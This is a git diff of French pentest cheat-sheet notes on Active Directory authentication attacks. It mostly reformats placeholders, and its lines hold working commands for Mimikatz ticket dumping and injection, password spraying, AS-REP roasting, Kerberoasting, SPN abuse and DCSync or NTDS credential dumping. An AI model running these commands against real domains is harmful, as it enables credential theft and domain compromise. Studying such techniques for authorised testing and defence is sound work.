@@ -1,4 +1,4 @@
-# Authentification
+﻿# Authentification
 
 ## Théorie
 
@@ -83,7 +83,7 @@ sekurlsa::tickets                 # dump TGT et TGS en mémoire
 
 ```
 sekurlsa::tickets /export          # exporter les tickets sur disque (.kirbi)
-kerberos::ptt <ticket.kirbi>       # injecter un ticket dans LSASS
+kerberos::ptt <TICKET.KIRBI>       # injecter un ticket dans LSASS
 ```
 
 **Mimikatz -  certificats non-exportables (AD CS)**
@@ -129,7 +129,7 @@ New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus
 **Méthode 2 -  SMB avec NetExec (depuis Kali)**
 
 ```bash
-nxc smb <IP> -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+nxc smb 'IP' -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 ```
 
 > `[+]` = credentials valides. `(Pwn3d!)` = l'utilisateur est **admin local** sur la cible.
@@ -162,17 +162,17 @@ Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activ
 
 ```bash
 # nxc -  tester une liste de users sans mot de passe
-nxc ldap <IP_DC> -u users.txt -p '' --asreproast asreproast.txt --kdcHost <IP_DC>
+nxc ldap 'IP_DC' -u users.txt -p '' --asreproast asreproast.txt --kdcHost 'IP_DC'
 
 # impacket -  même chose
-impacket-GetNPUsers -dc-ip <IP_DC> -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
+impacket-GetNPUsers -dc-ip 'IP_DC' -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
 ```
 
 **Avec un compte AD**
 
 ```bash
 # Kali -  énumère les users vulnérables ET récupère les hashes
-impacket-GetNPUsers -dc-ip <IP_DC> -outputfile hashes.asreproast corp.com/<user>:<password>
+impacket-GetNPUsers -dc-ip 'IP_DC' -outputfile hashes.asreproast corp.com/'USER':'PASSWORD'
 ```
 
 ```powershell
@@ -208,13 +208,13 @@ Attaque sur l'étape **KRB_TGS_REP**. N'importe quel utilisateur du domaine (san
 **Depuis Kali -  nxc (avec un compte valide)**
 
 ```bash
-nxc ldap <IP_DC> -u <user> -p <password> --kdcHost <IP_DC> --kerberoasting kerberoasting.txt
+nxc ldap 'IP_DC' -u 'USER' -p 'PASSWORD' --kdcHost 'IP_DC' --kerberoasting kerberoasting.txt
 ```
 
 **Depuis Kali -  impacket**
 
 ```bash
-impacket-GetUserSPNs -dc-ip <IP_DC> corp.com/<user>:<password> -outputfile hashes.kerberoast
+impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD' -outputfile hashes.kerberoast
 ```
 
 > Erreur `KRB_AP_ERR_SKEW` → synchroniser l'heure avec le DC : `sudo ntpdate <IP_DC>`
@@ -233,17 +233,17 @@ Si on contrôle un compte AS-REP roastable (sans pré-auth), on peut l'utiliser 
 ```bash
 # -u : compte AS-REP roastable (pas de pré-auth requise)
 # --no-preauth-targets : liste des comptes à kerberoaster
-nxc ldap <IP_DC> -u <asrep_user> -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
+nxc ldap 'IP_DC' -u 'ASREP_USER' -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
 ```
 
 **impacket**
 ```bash
-GetUserSPNs.py -no-preauth <asrep_user> -usersfile services.txt -dc-host <IP_DC> <DOMAIN>/
+GetUserSPNs.py -no-preauth <ASREP_USER> -usersfile services.txt -dc-host <IP_DC> <DOMAIN>/
 ```
 
 **Rubeus**
 ```powershell
-.\Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:<DOMAIN> /dc:<DC_HOST> /nopreauth:<asrep_user> /spn:<target_service>
+.\Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:<DOMAIN> /dc:<DC_HOST> /nopreauth:<ASREP_USER> /spn:<TARGET_SERVICE>
 ```
 
 #### Targeted Kerberoasting
@@ -255,33 +255,33 @@ Requiert `GenericAll`, `GenericWrite`, `WriteProperty` ou `Validated-SPN` sur la
 ```bash
 git clone https://github.com/ShutdownRepo/targetedKerberoast.git
 cd targetedKerberoast
-targetedKerberoast.py -v -d <domain> -u <user> -p <password>
+targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p <PASSWORD>
 ```
 
 **Depuis Kali -  manuellement avec nxc**
 
 ```bash
 # 1. Ajouter un SPN
-bloodyAD -d <domain> --host <IP_DC> -u <user> -p <password> set object <target> servicePrincipalName -v 'http/anything'
+bloodyAD -d <DOMAIN> --host <IP_DC> -u <USER> -p <PASSWORD> set object <TARGET> servicePrincipalName -v 'HTTP/ANYTHING'
 
 # 2. Kerberoaster
-nxc ldap <IP_DC> -d <domain> -u <user> -p <password> --kerberoasting kerberoastables.txt
+nxc ldap 'IP_DC' -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --kerberoasting kerberoastables.txt
 
 # 3. Cleanup
-bloodyAD -d <domain> --host <IP_DC> -u <user> -p <password> remove object <target> servicePrincipalName -v 'http/anything'
+bloodyAD -d <DOMAIN> --host <IP_DC> -u <USER> -p <PASSWORD> remove object <TARGET> servicePrincipalName -v 'HTTP/ANYTHING'
 ```
 
 **Depuis Windows -  PowerView**
 
 ```powershell
 # Vérifier que la cible n'a pas déjà un SPN
-Get-DomainUser 'victimuser' | Select serviceprincipalname
+Get-DomainUser 'VICTIMUSER' | Select serviceprincipalname
 
 # Ajouter un SPN
-Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
+Set-DomainObject -Identity 'VICTIMUSER' -Set @{serviceprincipalname='NONEXISTENT/BLAHBLAH'}
 
 # Récupérer le hash
-$User = Get-DomainUser 'victimuser'
+$User = Get-DomainUser 'VICTIMUSER'
 $User | Get-DomainSPNTicket | fl
 
 # Cleanup
@@ -302,7 +302,7 @@ Forger un service ticket (TGS) en utilisant le hash NTLM du compte de service. L
 |---|---|
 | Hash NTLM du compte de service | Mimikatz `sekurlsa::logonpasswords` (si session active sur la machine) |
 | Domain SID | `whoami /user` → retirer le RID (dernier `-XXXX`) |
-| SPN cible | `setspn -L <user>` ou `Get-NetUser -SPN` |
+| SPN cible | `setspn -L <USER>` ou `Get-NetUser -SPN` |
 
 **Récupérer le hash NTLM du service (Mimikatz)**
 
@@ -366,16 +366,16 @@ lsadump::dcsync /user:corp\Administrator
 **Depuis Kali (impacket-secretsdump)**
 
 ```bash
-impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:'<password>'@<IP_DC>
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@'IP_DC'
 
 # Dump tous les comptes
-impacket-secretsdump corp.com/jeffadmin:'<password>'@<IP_DC>
+impacket-secretsdump corp.com/jeffadmin:''PASSWORD''@'IP_DC'
 ```
 
 **Depuis Kali (NetExec)**
 
 ```bash
-nxc smb <IP_DC> -u '<user>' -p '<password>' --ntds
+nxc smb 'IP_DC' -u ''USER'' -p ''PASSWORD'' --ntds
 ```
 
 **Cracker le hash NTLM obtenu (mode 1000)**
